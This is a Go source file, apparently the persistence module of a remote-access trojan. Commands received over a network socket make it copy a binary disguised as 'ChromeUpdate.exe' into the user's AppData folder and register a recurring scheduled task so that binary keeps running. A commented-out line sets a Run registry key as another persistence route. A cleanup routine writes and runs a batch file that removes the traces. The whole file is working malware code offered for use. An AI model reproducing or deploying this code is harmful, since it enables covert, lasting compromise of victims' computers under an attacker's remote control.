package persist

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

func Schedule(connection net.Conn) (err error) {

	reader := bufio.NewReader(connection)
	command_raw, err := reader.ReadString('\n')
	command := strings.TrimSpace(command_raw)
	fmt.Println(command)
	home, _ := os.UserHomeDir()
	com := os.Chdir(filepath.Join(home, "AppData\\Roaming"))
	if com != nil {
		panic(com)
	}

	xml_data := "<Task xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\" version=\"1.4\">" +
		"\n<RegistrationInfo>" +
		"\n<Author>Anon\\Anonymous</Author>" +
		"\n<URI>\\ChromeUpdate</URI>" +
		"\n</RegistrationInfo>" +
		"\n<Triggers>" +
		"\n<TimeTrigger>" +
		"\n<Repetition>" +
		"\n<Interval>PT" + command + "M</Interval>" +
		"\n<StopAtDurationEnd>false</StopAtDurationEnd>" +
		"\n</Repetition>" +
		"\n<StartBoundary>2015-05-06T23:24:00</StartBoundary>" +
		"\n<Enabled>true</Enabled>" +
		"\n</TimeTrigger>" +
		"\n</Triggers>" +
		"\n<Principals>" +
		"\n<Principal id=\"Author\">" +
		"\n<UserId>S-1-5-21-3114169349-1207689747-4105279568-1001</UserId>" +
		"\n<LogonType>InteractiveToken</LogonType>" +
		"\n<RunLevel>LeastPrivilege</RunLevel>" +
		"\n</Principal>" +
		"\n</Principals>" +
		"\n<Settings>" +
		"\n<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>" +
		"\n<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>" +
		"\n<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>" +
		"\n<AllowHardTerminate>true</AllowHardTerminate>" +
		"\n<StartWhenAvailable>false</StartWhenAvailable>" +
		"\n<RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>" +
		"\n<IdleSettings>" +
		"\n<StopOnIdleEnd>true</StopOnIdleEnd>" +
		"\n<RestartOnIdle>false</RestartOnIdle>" +
		"\n</IdleSettings>" +
		"\n<AllowStartOnDemand>true</AllowStartOnDemand>" +
		"\n<Enabled>true</Enabled>" +
		"\n<Hidden>false</Hidden>" +
		"\n<RunOnlyIfIdle>false</RunOnlyIfIdle>" +
		"\n<DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>" +
		"\n<UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>" +
		"\n<WakeToRun>false</WakeToRun>" +
		"\n<ExecutionTimeLimit>PT72H</ExecutionTimeLimit>" +
		"\n<Priority>7</Priority>" +
		"\n</Settings>" +
		"\n<Actions Context=\"Author\">" +
		"\n<Exec>" +
		"\n<Command>" + filepath.Join(home, "AppData\\Roaming") + "\\ChromeUpdate.exe</Command>" +
		"\n</Exec>" +
		"\n</Actions>" +
		"\n</Task>"

	file, err := os.Create("schtask.xml")

	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	_, err2 := file.Write([]byte(xml_data))
	if err2 != nil {
		log.Fatal(err2)
	}
	err = file.Close()

	file_loc := filepath.Join(home, "AppData\\Roaming") + "\\ChromeUpdate.exe"
	fmt.Println(file_loc)

	c := exec.Command("powershell", "schtasks", "/DELETE", "/TN", "ChromeUpdate", "/F")
	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	c1 := exec.Command("powershell", "Copy-Item", "C:\\Users\\Anonymous\\Desktop\\CommandCam-master\\ChromeUpdate.exe", filepath.Join(home, "AppData\\Roaming"))
	if err := c1.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	c2 := exec.Command("powershell", "SCHTASKS", "/create", "/TN", "ChromeUpdate", "/xml", filepath.Join(home, "AppData\\Roaming\\schtask.xml"))
	if err := c2.Run(); err != nil {
		fmt.Println("Error: ", err)
	}
	/*
		c3 := exec.Command("powershell", "reg", "add", "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Start", "/t", "REG_SZ", "/d", "\""+file_loc+"\"", "/f")
		if err := c3.Run(); err != nil {
			fmt.Println("Error: ", err)
		}

		fmt.Println("powershell", "reg", "add", "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Start", "/t", "REG_SZ", "/d", "\""+file_loc+"\"", "/f")
	*/
	nbytes, err := connection.Write([]byte("[#] xml written\n"))
	if err != nil {
		panic(err)
	}
	fmt.Println("[+]", nbytes, "bytes written")

	return
}

func Remove(connection net.Conn) (err error) {

	content := "schtasks /DELETE /TN ChromeUpdate /F" +
		"\ndel %AppData%\\\\schtask.xml" +
		"\ndel %AppData%\\\\image.bmp" +
		"\ntaskkill /im ChromeUpdate.exe /f" +
		"\ndel %AppData%\\\\ChromeUpdate.exe" +
		"\n" +
		"\nrem SETLOCAL" +
		"\nrem SET someOtherProgram=SomeOtherProgram.exe" +
		"\nrem TASKKILL /IM \"%someOtherProgram%\"" +
		"\nrem DEL \"%~f0\""

	file, err := os.Create("clean.bat")

	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	_, err2 := file.Write([]byte(content))
	if err2 != nil {
		log.Fatal(err2)
	}
	err = file.Close()

	cmd := exec.Command("powershell", "./clean.bat")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	error := cmd.Run()
	if error != nil {
		fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
		return
	}

	c := exec.Command("powershell", "del", "clean.bat")
	if err := c.Run(); err != nil {
		fmt.Println("Error: ", err)
	}

	nbytes, erro := connection.Write([]byte(out.String()))
	if erro != nil {
		panic(erro)
	}
	fmt.Println("[+]", nbytes, "bytes written\n")

	return

}
